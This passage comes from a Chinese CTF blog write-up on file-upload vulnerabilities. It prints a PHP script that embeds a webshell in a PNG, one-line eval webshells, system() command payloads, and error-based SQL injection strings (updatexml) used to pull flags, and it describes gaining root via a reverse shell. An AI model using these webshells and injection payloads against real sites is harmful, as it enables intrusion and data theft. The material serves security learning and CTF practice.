<span class=\"token number\">0x0e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1b</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span>\n           <span class=\"token number\">0xbe</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2c</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xae</span><span class=\"token punctuation\">,</span>\n           <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfb</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xae</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xcc</span><span class=\"token punctuation\">,</span>\n           <span class=\"token number\">0x5a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xdc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xdc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9f</span><span class=\"token punctuation\">,</span>\n           <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbe</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4c</span><span class=\"token punctuation\">,</span>\n           <span class=\"token number\">0xa1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbf</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6b</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2d</span><span class=\"token punctuation\">,</span>\n           <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xad</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa1</span><span class=\"token punctuation\">,</span>\n           <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n\n<span class=\"token variable\">$img</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatetruecolor</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$y</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$y</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$y</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token variable\">$r</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$y</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$g</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$y</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$y</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$color</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$r</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$g</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token function\">imagesetpixel</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">,</span> <span class=\"token function\">round</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$y</span> <span class=\"token operator\">/</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$color</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">imagepng</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'./1.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>运行这个php文件后即会在当前目录出现一个1.png文件，我们可以用记事本来查看一下文件的内容<br><img src=\"https://img-blog.csdnimg.cn/9da6dc7985f34a02adff431ff04df9f4.png\" alt=\"在这里插入图片描述\"><br>可以发现木马文件存在其中，将这个文件上传<br><img src=\"https://img-blog.csdnimg.cn/34ba18b359c74e25bf2b3059040c4399.png\" alt=\"在这里插入图片描述\"><br>post抓包后进行修改数据，这里先介绍一个<code>call_user_func</code>函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">call_user_func — 把第一个参数作为回调函数调用\n<span class=\"token keyword type-declaration\">mixed</span> <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">callable</span> <span class=\"token variable\">$callback</span><span class=\"token punctuation\">)</span>\ncallback\n将被调用的回调函数（<span class=\"token keyword\">callable</span>）。 \nparameter\n<span class=\"token number\">0</span>个或以上的参数，被传入回调函数。 \n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个玩意可以检测一下是否可以执行(其实没啥必要，这里就是学习学习函数)，输入payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">url<span class=\"token operator\">&amp;</span><span class=\"token number\">0</span><span class=\"token operator\">=</span>call_user_func\n<span class=\"token number\">1</span><span class=\"token operator\">=</span>phpinfo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://img-blog.csdnimg.cn/c2d6fce57ac14bcb94cd62192427579d.png\" alt=\"在这里插入图片描述\"><br>然后发现可以执行，此时我们查看当前目录</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&amp;</span><span class=\"token number\">0</span><span class=\"token operator\">=</span>system\n<span class=\"token number\">1</span><span class=\"token operator\">=</span>ls <span class=\"token operator\">.</span><span class=\"token operator\">/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/c264e368449043709fb611e0b32a4169.png\" alt=\"在这里插入图片描述\"><br>获取flag</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">url<span class=\"token operator\">&amp;</span><span class=\"token number\">0</span><span class=\"token operator\">=</span>system\n<span class=\"token number\">1</span><span class=\"token operator\">=</span>tac f<span class=\"token operator\">*</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://img-blog.csdnimg.cn/a44351166f034e3c88bceb54d2ee06cf.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"题型新颖的文件上传\"><a href=\"#题型新颖的文件上传\" class=\"headerlink\" title=\"题型新颖的文件上传\"></a>题型新颖的文件上传</h2><h3 id=\"与反弹shell结合的文件上传（MRCTF签到）\"><a href=\"#与反弹shell结合的文件上传（MRCTF签到）\" class=\"headerlink\" title=\"与反弹shell结合的文件上传（MRCTF签到）\"></a>与反弹shell结合的文件上传（MRCTF签到）</h3><p><img src=\"https://img-blog.csdnimg.cn/dfad6e31dbfd48bd8c11e943a7de6059.png\" alt=\"在这里插入图片描述\"><br>发现是一道文件上传的题目，我们选择文件进行上传并且抓包，而后发现只有php文件可以上传，其他文件都是无法上传的，因此的话中间件解析漏洞和图片马就没法使用了，而后经过测试，我们发现这个system函数直接执行语句也是不行<br><img src=\"https://img-blog.csdnimg.cn/93fb090427144725875471e22708d5c1.png\" alt=\"在这里插入图片描述\"><br>此时我们想构造一句话木马<br><img src=\"https://img-blog.csdnimg.cn/310047ef57bb465c8d50f8c72a642747.png\" alt=\"在这里插入图片描述\"><br>发现一句话木马传不进去，post里面不放数字的时候可以<br><img src=\"https://img-blog.csdnimg.cn/a486d4990f7d4a11804aebf4a2233f91.png\" alt=\"在这里插入图片描述\"><br>这里尝试phpinfo()<br><img src=\"https://img-blog.csdnimg.cn/7ff1b0b0b2fc432e88d66e5ec375bf6c.png\" alt=\"在这里插入图片描述\"><br>也会报错<br>尝试伪协议，也无法进行绕过<br><img src=\"https://img-blog.csdnimg.cn/9c0c7620253a4b149262045f074365b9.png\" alt=\"在这里插入图片描述\"><br>此时我们尝试包含日志文件<br><img src=\"https://img-blog.csdnimg.cn/4255867ade2646b285ab824d52923515.png\" alt=\"在这里插入图片描述\"><br>结果依旧还是不行<br><img src=\"https://img-blog.csdnimg.cn/481a813402544d06a2705b4b289109e9.png\" alt=\"在这里插入图片描述\"><br>此时的话还有就是类似于变量拼接的那种，先把值赋给一个变量，再执行这个变量将结果给另一个变量，再将这个输出，具体如下<br><img src=\"https://img-blog.csdnimg.cn/f0eb4451305e44468779122138386be4.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/82ada66ac71941d28b6b4f79e62bd341.png\" alt=\"在这里插入图片描述\"><br>至于为什么要用这种形式，而不是直接<code>eval ($a)</code>，这只是因为直接上传的时候会报错<br><img src=\"https://img-blog.csdnimg.cn/179948f7715f46d7ae3dcc1b03201e16.png\" alt=\"在这里插入图片描述\"><br>而我们知道eval函数的执行方式还可以这样运用<code>eval(&quot;return $a;&quot;);</code>,因此我们这里的话就可以尝试这样来进行</p>\n<p>此时的话你会发现这个可以输出，那我们把数字运算，改成post1，不就也可以传上去了吗，尝试一下</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token operator\">&lt;</span>?php\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span>eval<span class=\"token punctuation\">(</span><span class=\"token string\">\" return <span class=\"token variable\">$a</span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/7695f8353e924e4f94a02abb3702c88e.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/29a1947779ff40159e8b7e1ece486784.png\" alt=\"在这里插入图片描述\"><br>但此时你去上传phpinfo()<br><img src=\"https://img-blog.csdnimg.cn/bab54f00ac934231b24cd9eb864be996.png\" alt=\"在这里插入图片描述\"><br>发现什么也没有，这是为什么呢，因为我们的语句，那个post1是单引号，它是不解析的，因为不解析，所以返回的是字符串，所以输出是空，那怎么样才能让他输出呢，我们再加一个eval给它试试<br><img src=\"https://img-blog.csdnimg.cn/722665302cd24aadbfbd8abdebd1ac8d.png\" alt=\"在这里插入图片描述\"><br>我们如果想让他解析，就需要改为双引号，或者是把<code>echo $b</code> 修改为<code>eval $b</code>，也就是上图<br>此时就构造出来了，因此我们传入的一句话木马就是</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token operator\">&lt;</span>?php\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span>eval<span class=\"token punctuation\">(</span><span class=\"token string\">\" return <span class=\"token variable\">$a</span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin class-name\">eval</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>或者</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token operator\">&lt;</span>?php\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span>eval<span class=\"token punctuation\">(</span><span class=\"token string\">\" return <span class=\"token variable\">$a</span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin class-name\">eval</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>此时我们进行查找<br><img src=\"https://img-blog.csdnimg.cn/23bca4eae786404395a6b7526bedde58.png\" alt=\"在这里插入图片描述\"></p>\n<p>进行蚁剑连接后<br><img src=\"https://img-blog.csdnimg.cn/9d5cc45b37984425a37fd0c63f58b0ed.png\" alt=\"在这里插入图片描述\"><br>也只有这样，而此时你再看题给有hint<br><img src=\"https://img-blog.csdnimg.cn/bbdd085e6706418990600c3806002ebd.png\" alt=\"在这里插入图片描述\"><br>找不到flag为正常情况<br>此时就可能需要提权了，我们此时是个低权限用户，变成root用户才行，此时反弹shell服务器也找不到内核具体版本，从而找不到类似的提权办法，利用常见的脏牛发现也不行，<br>此时在index.php文件下进行ls-al查看一下权限<br><img src=\"https://img-blog.csdnimg.cn/d99de5484d844fa1b97747ed9aa81f1f.png\" alt=\"在这里插入图片描述\">发现index.php本身是个root权限，此时我们知道这个php文件传入的时候是root权限，那我们直接利用php文件进行反弹shell到服务器，服务器开启监听，这时候就可以得到root权限<br><img src=\"https://img-blog.csdnimg.cn/4f76b30d62f847b999482246094db456.png\" alt=\"在这里插入图片描述\"><br>看起来504，但是其实他在这个过程中已经执行了语句<br><img src=\"https://img-blog.csdnimg.cn/c3075bb3e82b4702b46d8cdd935c453d.png\" alt=\"在这里插入图片描述\"><br>执行查找flag语句</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">grep</span> -r <span class=\"token string\">\"MRCTF&#123;\"</span> /var<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://img-blog.csdnimg.cn/53607d9db2a845ec94162e6fce4acb36.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"结合SQL注入的文件上传（网刃杯upload）\"><a href=\"#结合SQL注入的文件上传（网刃杯upload）\" class=\"headerlink\" title=\"结合SQL注入的文件上传（网刃杯upload）\"></a>结合SQL注入的文件上传（网刃杯upload）</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550663.png\" alt=\"在这里插入图片描述\"><br>此时就可以看见是文件上传，同时提示了sql yyds，说明可能和sql注入存在某种联系，此时我们打开环境<br><img src=\"https://img-blog.csdnimg.cn/f36ddcb72dd2473eb81c52afb95b36a4.png\" alt=\"在这里插入图片描述\"><br>随便上传一个文件<br><img src=\"https://img-blog.csdnimg.cn/cb02421fa3de472786f940e3d4041ad5.png\" alt=\"在这里插入图片描述\"><br>此时的话就抓包修改content-type为ctf<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550740.png\" alt=\"在这里插入图片描述\"><br>查看这个文件你会发现他不进行解析<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550028.png\" alt=\"在这里插入图片描述\"><br>而且你会发现，他对每个上传成功的文件进行了重命名，因此那个利用apache解析漏洞修改.htacess文件的方法就失效了，因为前面加有东西的话，这个就无效了，此时我们图片马也就不用想了，试试phtml这个<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550197.png\" alt=\"在这里插入图片描述\"></p>\n<p>依然是不解析<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550158.png\" alt=\"在这里插入图片描述\"><br>此时的话我们想一下开头就提到了那个sql yyds ，我们去百度一下后会发现真的有文件上传+sql注入的这种题存在<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550288.png\" alt=\"在这里插入图片描述\"><br>简单了解过后，发现这些都是在文件名处进行注入，因此我们尝试把文件名当成注入点进行尝试，sql注入一般都是单引号或者啥的闭合，我们先让文件名来个<code>1&#39;</code>试试<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550447.png\" alt=\"在这里插入图片描述\"><br>报错了，你会发现1’后面是’)，那这不就说明闭合方式是’)了，我们尝试给它闭合住，构造payload如下</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token number\">1</span>'or <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550806.png\" alt=\"在这里插入图片描述\"><br>此时尝试进行联合查询<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550823.png\" alt=\"在这里插入图片描述\"><br>发现报错了，猜测可能是字段数的问题，但是修改后还是报错，emm，那我此时看着报错，想着为啥不用报错注入呢，这里用报错注入尝试一下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">-</span><span class=\"token number\">1</span>' <span class=\"token operator\">and</span> updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550008.png\" alt=\"在这里插入图片描述\"><br>爆出了数据库名，这里我们再尝试爆表</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span>upload'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550993.png\" alt=\"在这里插入图片描述\"><br>此时报错了但未爆出表名，你看上面的sql语句，会发现少了个东西，<code>select table_name from information_schema</code>这个查表的语句没有出现在这里，前面变成了一串字符串，说明这里查表语句被过滤了，那我们这里的话应该是还有其他方法可以获取表名的，不过我这里想试试盲猜(太菜，其他不会，只能死马当做活马医)，我猜flag位于flag列，进行尝试，</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">-</span><span class=\"token number\">1</span>' <span class=\"token keyword\">and</span> <span class=\"token function\">updatexml</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>select flag from flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550033.png\" alt=\"在这里插入图片描述\">擦，还真有，那我们随便用个截取函数，截取后半部分<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550241.png\" alt=\"在这里插入图片描述\"><br>两者结合一下，就可以得到flag<code>flag&#123;5937a0b90b5966939cccd369291c68aa&#125;</code></p>\n<h1 id=\"尾记\"><a href=\"#尾记\" class=\"headerlink\" title=\"尾记\"></a>尾记</h1><p>博主是一个小白，可能在多方面存在问题，在做过ctf赛题后也是深感到自己知识的匮乏，总结的多有不当，有问题还请各位师傅多多指教！！！</p>\n<p>参考文章<br><a><br><a href=\"https://www.cnblogs.com/Linkas/p/15115240.html\">https://www.cnblogs.com/Linkas/p/15115240.html</a><br><a href=\"https://blog.csdn.net/frankarmstrong/article/details/72235206\">https://blog.csdn.net/frankarmstrong/article/details/72235206</a><br><a href=\"https://www.php.cn/php-weizijiaocheng-415762.html\">https://www.php.cn/php-weizijiaocheng-415762.html</a><br><a href=\"https://www.freebuf.com/vuls/279171.html\">https://www.freebuf.com/vuls/279171.html</a><br><a href=\"https://blog.csdn.net/qq_26090065/article/details/81458937\">https://blog.csdn.net/qq_26090065/article/details/81458937</a><br><a href=\"https://www.jianshu.com/p/71b8b554d9b3\">https://www.jianshu.com/p/71b8b554d9b3</a><br><a href=\"https://blog.csdn.net/qq_37133717/article/details/94590122\">https://blog.csdn.net/qq_37133717/article/details/94590122</a><br><a href=\"https://blog.csdn.net/qq_32434307/article/details/79480036\">https://blog.csdn.net/qq_32434307/article/details/79480036</a><br><a href=\"https://blog.csdn.net/frankarmstrong/article/details/72235206\">https://blog.csdn.net/frankarmstrong/article/details/72235206</a><br>ttps://blog.csdn.net/weixin_45588247/article/details/119652017<br><a href=\"https://www.freebuf.com/articles/web/328985.html\">https://www.freebuf.com/articles/web/328985.html</a><br><a href=\"https://blog.csdn.net/qq_38684504/article/details/90047213\">https://blog.csdn.net/qq_38684504/article/details/90047213</a><br><a href=\"https://www.freebuf.com/articles/web/247967.html\">https://www.freebuf.com/articles/web/247967.html</a><br><a href=\"https://blog.csdn.net/haha13l4/article/details/96913574\">https://blog.csdn.net/haha13l4/article/details/96913574</a><br><a href=\"https://blog.csdn.net/weixin_46137328/article%E5%89%8D%E8%A8%80\">https://blog.csdn.net/weixin_46137328/article前言</a><br></a></p>\n","feature":true,"text":"前言文件上传与文件包含这种漏洞都是比较常见的漏洞，在学习过后对其进行简单总结，希望能对正在学习此部分的师傅们有一些帮助。 漏洞相关信息漏洞定义文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”...","link":"","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"文件上传","slug":"文件上传","count":1,"path":"api/tags/文件上传.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">漏洞相关信息</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%B9%89\"><span class=\"toc-text\">漏洞定义</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3\"><span class=\"toc-text\">漏洞危害</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">漏洞常用知识</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E6%94%B9%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87%EF%BC%88%E5%89%8D%E7%AB%AF%E4%BF%AE%E6%94%B9js%E4%BB%A3%E7%A0%81\"><span class=\"toc-text\">修改后缀名绕过（前端修改js代码)</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">修改文件头绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E6%94%B9-user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">修改.user.ini配置文件绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X03%EF%BC%88-user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%93%E5%90%88%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%EF%BC%89\"><span class=\"toc-text\">0X03（.user.ini配置文件结合日志包含）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">修改文件内容绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">中间件解析漏洞</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#00%E6%88%AA%E6%96%AD\"><span class=\"toc-text\">%00截断</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%BB%95%E8%BF%87-%E7%BB%93%E5%90%88-user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%AE%E6%94%B9\"><span class=\"toc-text\">条件竞争绕过(结合.user.ini配置文件的修改)</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95\"><span class=\"toc-text\">二次渲染绕</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 